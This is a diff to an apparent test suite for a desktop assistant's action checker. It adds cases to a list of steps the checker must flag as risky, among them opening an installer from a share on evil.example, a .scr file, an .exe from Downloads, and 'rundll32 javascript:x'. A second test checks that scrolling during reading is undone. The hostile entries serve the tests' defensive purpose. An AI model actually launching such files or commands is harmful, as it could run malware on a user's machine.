@@ -173,7 +173,9 @@ class AutopilotStepsTests(unittest.TestCase):
                 ("type_text", 'Type into edit "Card number" in "Shop":\n\n4111'),
                 ("type_text", 'Type into edit "Password" in "Sign in":\n\nhunter2'),
                 ("press_keys", 'Press shift+delete in "Files"'), ("press_keys", 'Press alt+f4 in "Essay"'),
-                ("open_app", "Open powershell"), ("open_app", "Open C:\\Users\\me\\Downloads\\setup.bat")]
+                ("open_app", "Open powershell"), ("open_app", "Open C:\\Users\\me\\Downloads\\setup.bat"),
+                ("open_app", "Open \\\\evil.example\\share\\setup.msi"), ("open_app", "Open C:\\Users\\me\\Downloads\\invoice.scr"),
+                ("open_app", "Open C:\\Users\\me\\Downloads\\update.exe"), ("open_app", "Open rundll32 javascript:x")]
         for name, summary in asks:
             self.assertTrue(risky_step(name, summary), summary)
 
@@ -219,6 +221,13 @@ class AutopilotStepsTests(unittest.TestCase):
         self.assertEqual(text.split("\n")[1:], ["Title", "Intro", "Body one", "Body two", "Conclusion"])
         keys = [request["keys"] for request in assist.requests if request["cmd"] == "keys"]
         self.assertEqual(keys, ["{PGDN}"] * 3 + ["{PGUP}"] * 2)  # the last page down did nothing: two pages back up
+
+    def test_a_long_article_ends_where_the_owner_was(self) -> None:
+        assist = FakeAssist(NOTEPAD)
+        assist.pages = [f"Paragraph {number}" for number in range(30)]  # longer than Nova reads
+        session_for(assist).read_text()
+        keys = [request["keys"] for request in assist.requests if request["cmd"] == "keys"]
+        self.assertEqual(keys.count("{PGDN}"), keys.count("{PGUP}"))  # every page down is undone
 
     def test_a_short_window_is_read_once_and_not_scrolled_back(self) -> None:
         assist = FakeAssist(NOTEPAD)
